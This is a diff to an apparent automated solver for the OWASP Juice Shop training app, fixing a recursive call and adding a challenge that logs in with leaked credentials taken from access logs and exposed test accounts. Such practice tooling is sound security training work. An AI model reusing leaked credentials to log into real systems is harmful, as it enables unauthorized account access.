@@ -428,6 +428,9 @@ def solve_user_challenges(server):
     try: login_with_exposed_credentials(server)
     except Exception as e: print(e)
 
+    try: solve_leaked_access_logs(server)
+    except Exception as e: print(e)
+
     try: solve_csrf_challenge(server)
     except Exception as e: print(e)
 
@@ -641,13 +644,15 @@ def login_with_exposed_credentials(server):
     Email: testing@juice-sh.op
     Password: IamUsedForTesting
     """
+    print("Logging in with exposed testing credentials..."),
     try:
-        login_with_exposed_credentials(server)
-    except Exception as e: print(e)
-
-    try:
-        solve_leaked_access_logs(server)
-    except Exception as e: print(e)
+        session = get_session(server, 'testing@juice-sh.op', 'IamUsedForTesting')
+        if session:
+            print("Success.")
+        else:
+            print("Failed.")
+    except Exception as e:
+        print(f"Failed: {e}")
 
 def solve_leaked_access_logs(server):
     """
@@ -656,11 +661,13 @@ def solve_leaked_access_logs(server):
     Password: 0987654321
     """
     print("Logging in with leaked access log credentials (J12934)..."),
-    session = get_session(server, 'J12934@juice-sh.op', '0987654321')
-    if session:
-        print("Success.")
-    else:
-        print("Failed.")
+    try:
+        session = get_session(server, 'J12934@juice-sh.op', '0987654321')
+        if session:
+            print("Success.")
+        else:
+            print("Failed.")
+    except Exception as e: print(e)
 
 def solve_csrf_challenge(server):
     """
